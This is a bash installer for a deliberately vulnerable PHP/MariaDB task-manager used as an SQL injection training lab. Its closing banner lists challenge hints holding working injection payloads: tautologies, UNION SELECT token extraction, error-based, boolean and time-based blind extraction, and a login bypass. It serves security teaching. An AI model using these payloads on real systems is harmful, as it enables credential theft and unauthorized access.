#!/usr/bin/env bash
#
# DBS401 SQL Injection Playground — Automated Setup
# ==================================================
# Installs & configures everything needed to run the
# intentionally-vulnerable Task Manager on a fresh Debian/Ubuntu VM.
#
# Usage:  sudo bash setup.sh
#

# No set -e so we can handle errors gracefully
set -u

# ──────────────────────────────────────────────
# 0.  Configuration
# ──────────────────────────────────────────────
REPO_URL="https://github.com/minhprovjp/task-manager.git"
REPO_BRANCH="master"
DB_NAME="task_manager"
DB_USER="taskmgr_user"
DB_PASS=""                              # auto-generated below if empty
SITE_DIR="/var/www/html/task-manager"

# ──────────────────────────────────────────────
# 1.  Preliminaries
# ──────────────────────────────────────────────
log()  { printf "\e[32m[*]\e[0m %s\n" "$*"; }
warn() { printf "\e[33m[!]\e[0m %s\n" "$*"; }
err()  { printf "\e[31m[-]\e[0m %s\n" "$*"; }

if [[ $EUID -ne 0 ]]; then
    err "This script must be run as root (sudo)."
    exit 1
fi

if [[ -z "${DB_PASS}" ]]; then
    DB_PASS="$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 20 | head -n1 2>/dev/null)"
fi

log "DBS401 Playground Installer"
log "Target: ${SITE_DIR}"
echo ""

# ──────────────────────────────────────────────
# 2.  OS Detection & Package Helpers
# ──────────────────────────────────────────────
OS_SUPPORTED=0
if [[ -f /etc/os-release ]]; then
    grep -qiE 'debian|ubuntu' /etc/os-release 2>/dev/null && OS_SUPPORTED=1
fi
if [[ $OS_SUPPORTED -eq 0 && -f /etc/lsb-release ]]; then
    grep -qiE 'debian|ubuntu' /etc/lsb-release 2>/dev/null && OS_SUPPORTED=1
fi

if [[ $OS_SUPPORTED -eq 0 ]]; then
    err "Unsupported OS – this script targets Debian / Ubuntu."
    exit 1
fi

pkg_installed() {
    dpkg-query -W -f='${Status}' "$1" 2>/dev/null | grep -qc "install ok installed" || return 1
    return 0
}

pkg_ensure() {
    local pkg="$1"
    if pkg_installed "${pkg}"; then
        log "${pkg}  already installed"
        return 0
    fi
    log "Installing ${pkg} ..."
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkg}" 2>&1 || {
        warn "Failed to install ${pkg} — continuing anyway"
        return 1
    }
}

# ──────────────────────────────────────────────
# 3.  Install System Dependencies
# ──────────────────────────────────────────────
log "Updating package lists ..."
apt-get update -qq 2>&1 || warn "apt-get update failed — network might be unavailable"

log "Checking / installing dependencies ..."

# Apache
pkg_ensure "apache2"

# MariaDB server
if ! pkg_installed "mariadb-server" && ! pkg_installed "mysql-server"; then
    pkg_ensure "mariadb-server"
    pkg_ensure "mariadb-client"
else
    log "MySQL/MariaDB server already installed"
fi

# PHP + Apache module + MySQL extension
pkg_ensure "php"
pkg_ensure "libapache2-mod-php"
pkg_ensure "php-mysql"

# Utilities
pkg_ensure "git"
pkg_ensure "unzip"

# ──────────────────────────────────────────────
# 4.  Ensure Services Are Running
# ──────────────────────────────────────────────
echo ""
log "Starting services ..."

for svc in apache2 mariadb mysql; do
    if systemctl is-active --quiet "${svc}" 2>/dev/null; then
        log "${svc} already running"
        break
    fi
done

systemctl start apache2 2>/dev/null  || warn "Could not start apache2"
systemctl start mariadb 2>/dev/null || systemctl start mysql 2>/dev/null || warn "Could not start MySQL/MariaDB"

# ──────────────────────────────────────────────
# 5.  Clone / Update Source Code
# ──────────────────────────────────────────────
echo ""
log "Fetching source code from ${REPO_URL} ..."

if echo "${REPO_URL}" | grep -q "YOUR_ORG"; then
    warn "REPO_URL still points to placeholder — check setup.sh line 15"
    warn "Using local files instead (must be run from the repo directory)"
    SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
    if [[ -f "${SCRIPT_DIR}/task_manager.sql" ]]; then
        log "Found local files in ${SCRIPT_DIR}"
        mkdir -p "${SITE_DIR}" "${SITE_DIR}/config" "${SITE_DIR}/css"
        cp "${SCRIPT_DIR}"/*.php "${SITE_DIR}/" 2>/dev/null
        cp "${SCRIPT_DIR}"/*.sql "${SITE_DIR}/" 2>/dev/null
        cp "${SCRIPT_DIR}"/*.md "${SITE_DIR}/" 2>/dev/null
        cp "${SCRIPT_DIR}/config/constants.php" "${SITE_DIR}/config/" 2>/dev/null
        cp "${SCRIPT_DIR}/css/style.css" "${SITE_DIR}/css/" 2>/dev/null
        cp "${SCRIPT_DIR}/setup.sh" "${SITE_DIR}/" 2>/dev/null
    else
        err "No local files found and REPO_URL has placeholder — edit setup.sh first"
        exit 1
    fi
else
    if [[ -d "${SITE_DIR}" ]]; then
        log "Directory exists — pulling latest ..."
        cd "${SITE_DIR}" && git pull origin "${REPO_BRANCH}" 2>&1 || warn "git pull failed"
    else
        git clone --branch "${REPO_BRANCH}" --depth 1 "${REPO_URL}" "${SITE_DIR}" 2>&1 || {
            err "Failed to clone repository — check REPO_URL and network"
            exit 1
        }
    fi
fi

# ──────────────────────────────────────────────
# 6.  Configure Database
# ──────────────────────────────────────────────
echo ""
log "Configuring database ..."

# Create database (idempotent)
mysql -u root -e "CREATE DATABASE IF NOT EXISTS \`${DB_NAME}\` CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;" 2>&1 || {
    err "Failed to create database — is MySQL running?"
    exit 1
}

# Create application user
# On MariaDB 10.3+, CREATE USER IF NOT EXISTS may leave an empty auth plugin,
# causing PHP's mysql_native_password to fail.  Drop + recreate to force the
# correct plugin.
mysql -u root -e "DROP USER IF EXISTS '${DB_USER}'@'localhost';" 2>&1
mysql -u root -e "DROP DATABASE IF EXISTS \`${DB_NAME}\`;" 2>&1
mysql -u root -e "CREATE USER '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';" 2>&1 || {
    err "Failed to create database user"
    exit 1
}
mysql -u root -e "GRANT ALL PRIVILEGES ON \`${DB_NAME}\`.* TO '${DB_USER}'@'localhost'; FLUSH PRIVILEGES;" 2>&1 || warn "Could not grant privileges"

# Import schema & seed data
if [[ -f "${SITE_DIR}/task_manager.sql" ]]; then
    mysql -u root "${DB_NAME}" < "${SITE_DIR}/task_manager.sql" 2>&1
    log "Schema imported"
else
    warn "task_manager.sql not found at ${SITE_DIR}/task_manager.sql — skipping DB import"
fi

# ──────────────────────────────────────────────
# 7.  Write Application Configuration
# ──────────────────────────────────────────────
echo ""
log "Writing application config ..."

mkdir -p "${SITE_DIR}/config"

cat > "${SITE_DIR}/config/constants.php" <<'CONFIGEOF'
<?php
session_start();

define('LOCALHOST', 'localhost');
define('DB_USERNAME', 'DB_USER_PLACEHOLDER');
define('DB_PASSWORD', 'DB_PASS_PLACEHOLDER');
define('DB_NAME', 'DB_NAME_PLACEHOLDER');

$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host  = $_SERVER['HTTP_HOST'];
$dir   = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\');
define('SITEURL', "$proto://$host$dir/");

// Require login for all pages except login.php
if (!isset($_SESSION['user']) && basename($_SERVER['PHP_SELF']) != 'login.php') {
    header("Location: ".SITEURL."login.php");
    exit;
}
CONFIGEOF

sed -i "s/DB_USER_PLACEHOLDER/${DB_USER}/g" "${SITE_DIR}/config/constants.php"
sed -i "s/DB_PASS_PLACEHOLDER/${DB_PASS}/g" "${SITE_DIR}/config/constants.php"
sed -i "s/DB_NAME_PLACEHOLDER/${DB_NAME}/g" "${SITE_DIR}/config/constants.php"

log "config/constants.php updated"

# ──────────────────────────────────────────────
# 8.  Set Permissions
# ──────────────────────────────────────────────
echo ""
log "Setting file permissions ..."
chown -R www-data:www-data "${SITE_DIR}" 2>/dev/null || warn "Could not set ownership"
find "${SITE_DIR}" -type d -exec chmod 755 {} \; 2>/dev/null
find "${SITE_DIR}" -type f -exec chmod 644 {} \; 2>/dev/null

# ──────────────────────────────────────────────
# 9.  Restart Apache
# ──────────────────────────────────────────────
echo ""
log "Restarting Apache ..."
systemctl restart apache2 2>&1 || warn "Could not restart apache2"

# ──────────────────────────────────────────────
# 10. Summary
# ──────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║       DBS401 SQL Injection Playground — Ready!         ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "  Local access:  http://localhost/task-manager/"
echo "  LAN access:    http://$(hostname -I 2>/dev/null | awk '{print $1}')/task-manager/"
echo "  (SITEURL auto-detects the IP — other machines on your"
echo "   LAN can reach it at the VM's IP shown above.)"
echo ""
echo "  DB:   ${DB_NAME}  |  User: ${DB_USER}  |  Pass: ${DB_PASS}"
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  Challenge Hints                                        ║"
echo "╠══════════════════════════════════════════════════════════╣"
echo "║                                                         ║"
echo "║  Flag 1 (Easy  —  in-band numeric OR)                   ║"
echo "║    list-task.php?list_id=1 OR 1=1                       ║"
echo "║    → dumps ALL tasks including a hidden one with        ║"
echo "║      a secret in its description.                       ║"
echo "║                                                         ║"
echo "║  Flag 2 (Easy  —  in-band string OR)                    ║"
echo "║    search.php?q=' OR '1'='1                            ║"
echo "║    → dumps ALL tasks, revealing another hidden task.    ║"
echo "║                                                         ║"
echo "║  Flag 3 (Medium  —  UNION SELECT)                       ║"
echo "║    search.php?q=' UNION SELECT 1,username,token,4,5,6   ║"
echo "║      FROM tbl_users WHERE role='admin' -- -             ║"
echo "║    → extracts the admin API token.                      ║"
echo "║                                                         ║"
echo "║  Flag 4 (Medium  —  error-based EXTRACTVALUE)           ║"
echo "║    search.php?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,        ║"
echo "║      (SELECT token FROM tbl_users WHERE username=       ║"
echo "║      'staff'))) OR '1'='1                               ║"
echo "║    → leaks the staff token in a MySQL XPATH error.      ║"
echo "║                                                         ║"
echo "║  Flag 5 (Hard  —  boolean blind)                        ║"
echo "║    user-check.php?id=1 AND (SELECT SUBSTRING(           ║"
echo "║      token,1,1) FROM tbl_users WHERE username=          ║"
echo "║      'staff')='D'                                       ║"
echo "║    → \"User found\" vs \"User not found\" oracle.           ║"
echo "║      Extract the staff token char by char.              ║"
echo "║                                                         ║"
echo "║  Flag 6 (Hard  —  time-based blind)                     ║"
echo "║    list-task.php?list_id=1 AND IF(                      ║"
echo "║      (SELECT SUBSTRING(token,N,1) FROM tbl_users        ║"
echo "║      WHERE username='staff')='X',SLEEP(2),0)            ║"
echo "║    → ~2s delay if char matches.                         ║"
echo "║      Extract the staff token char by char.              ║"
echo "║                                                         ║"
echo "║                                                         ║"
echo "║  Flag 7 (Easy  —  Auth Bypass)                          ║"
echo "║    login.php                                            ║"
echo "║    Username: admin' #                                   ║"
echo "║    → logs in as admin without password, reveals flag.   ║"
echo "║                                                         ║"
echo "║  Flag 8 (Medium  —  UNION SELECT 2)                     ║"
echo "║    profile.php?user_id=1 UNION SELECT 1,token,3         ║"
echo "║      FROM tbl_users WHERE username='manager' -- -       ║"
echo "║    → extracts the manager API token.                    ║"
echo "║                                                         ║"
echo "║  Flag 9 (Hard  —  ORDER BY SQLi)                        ║"
echo "║    index.php?sort=(SELECT IF(SUBSTRING(secret_value,    ║"
echo "║      1,1)='D',SLEEP(2),0) FROM tbl_secrets WHERE        ║"
echo "║      secret_key='order_by_flag')                        ║"
echo "║    → ~2s delay if char matches.                         ║"
echo "║                                                         ║"
echo "║  Flag 10 (Hard  —  INSERT SQLi)                         ║"
echo "║    contact.php (Submit in Name field)                   ║"
echo "║    test',(SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT     ║"
echo "║      secret_value FROM tbl_secrets WHERE                ║"
echo "║      secret_key='admin_email_flag')))),'message')-- -   ║"
echo "║    → leaks the flag in a MySQL XPATH error.             ║"
echo "║                                                         ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
log "Setup complete."
